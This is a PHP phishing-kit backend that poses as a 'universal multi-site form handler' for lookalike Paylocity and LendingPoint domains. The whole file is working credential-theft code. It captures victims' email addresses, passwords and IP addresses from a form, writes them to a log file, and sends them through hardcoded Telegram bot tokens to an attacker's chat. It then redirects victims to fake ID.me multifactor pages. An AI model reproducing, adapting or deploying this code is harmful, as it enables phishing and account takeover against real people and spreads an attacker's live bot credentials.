<?php
// =========================================
// 🌐 UNIVERSAL MULTI-SITE FORM HANDLER
// =========================================

include 'firewall.php';

// === Configuration: Replace with real domains ===
$site_map = [
    'paylocitylive.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => 'BOT_TOKEN_1B', 'chat_id' => 'CHAT_ID_1B']
        ],
        'redirect' => 'https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],
    
    'lending-point.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388']
        ],
        'redirect' => 'https://lending-point.rf.gd/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],
    // Add more sites...
];


$log_file = 'submission_log.txt';

// === Logging Function ===
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] " . $data . "\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// === Telegram Sender ===
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// === Main Logic ===
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $useremail    = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
    $ip           = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $timestamp    = date("Y-m-d H:i:s");
    $domain       = $_SERVER['HTTP_HOST'];

    $msg = "📝 *New Submission from $domain*\n\n".
           "👤 *Email:* $useremail\n".
           "🔑 *Password:* $userpassword\n".
           "🌐 *IP:* $ip\n".
           "⏰ *Time:* $timestamp";

    logToFile("[$domain] $useremail | $userpassword | $ip", $log_file);

    if (isset($site_map[$domain])) {
        $site_config = $site_map[$domain];
        sendToBots($msg, $site_config['bots']);
        header("Location: " . $site_config['redirect']);
        exit;
    } else {
        logToFile("❌ Unrecognized domain: $domain", $log_file);
        exit("Unauthorized domain");
    }
}
?>
